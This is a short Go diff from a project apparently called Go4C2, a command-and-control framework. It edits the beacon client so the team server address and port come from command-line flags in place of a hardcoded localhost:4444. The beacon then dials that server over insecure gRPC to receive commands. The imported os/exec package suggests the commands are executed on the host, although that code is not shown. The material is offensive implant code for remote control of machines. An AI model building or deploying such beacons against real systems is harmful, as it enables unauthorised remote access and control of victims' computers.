@@ -3,8 +3,10 @@ package main
 import (
 	"Go4C2/grpcapi"
 	"context"
+	"flag"
 	"fmt"
 	"log"
+	"os"
 	"os/exec"
 	"strings"
 	"time"
@@ -12,21 +14,23 @@ import (
 	"google.golang.org/grpc"
 )
 
-var (
-	g_strTeamServer     = "localhost"
-	g_nBeaconServerPort = 4444
-)
-
 func main() {
 	var (
-		conn         *grpc.ClientConn
-		err          error
-		beaconClient grpcapi.BeaconClient
-		grpcCmd      *grpcapi.Command
+		conn          *grpc.ClientConn
+		err           error
+		beaconClient  grpcapi.BeaconClient
+		grpcCmd       *grpcapi.Command
+		strFlagServer string
+		nFlagPort     uint
 	)
-
+	flag.StringVar(&strFlagServer, "server", "", "team server ip")
+	flag.UintVar(&nFlagPort, "port", 0, "team server port")
+	flag.Parse()
+	if len(os.Args) <= 1 {
+		log.Fatalf("-h to see usage")
+	}
 	// 1. connect to the team server
-	server := fmt.Sprintf("%s:%d", g_strTeamServer, g_nBeaconServerPort)
+	server := fmt.Sprintf("%s:%d", strFlagServer, nFlagPort)
 	conn, err = grpc.Dial(server, grpc.WithInsecure())
 	if nil != err {
 		log.Fatalf("grpc.Dial error: %v", err)
